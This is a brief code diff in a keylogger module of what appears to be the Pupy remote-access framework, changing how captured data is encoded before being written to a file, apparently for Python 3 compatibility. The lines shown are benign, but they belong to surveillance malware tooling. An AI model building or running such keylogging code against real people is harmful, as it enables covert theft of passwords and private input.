@@ -92,7 +92,7 @@ class KeyloggerModule(PupyModule):
                 self.log(data)
 
                 with open(filepath, 'w') as f:
-                    if type(data) == unicode:
+                    if not isinstance(data, bytes):
                         data = data.encode('utf-8')
                     f.write(data)
 
